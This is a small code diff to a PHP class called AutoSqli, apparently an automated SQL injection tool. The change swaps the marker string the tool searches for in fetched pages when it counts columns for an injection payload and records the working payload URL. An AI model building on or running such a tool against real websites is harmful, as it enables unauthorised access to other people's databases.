@@ -116,14 +116,14 @@ class AutoSqli
             $content = self::getContent($full_url);
             $content1 = self::getContent($full_url1);
 
-            if (Regex::match('/sqli indosec/', $content)->hasMatch()) {
+            if (Regex::match('/sqli trhacknon/', $content)->hasMatch()) {
                 echo "[+] Columns Total: $i \n";
                 self::$number_colum = $i;
                 self::$url_payload_ncolum = $full_url;
                 break;
             }
 
-            if (Regex::match('/sqli indosec/', $content1)->hasMatch()) {
+            if (Regex::match('/sqli trhacknon/', $content1)->hasMatch()) {
                 echo "[+] Columns Total: $i \n";
                 self::$number_colum = $i;
                 self::$url_payload_ncolum = $full_url1;
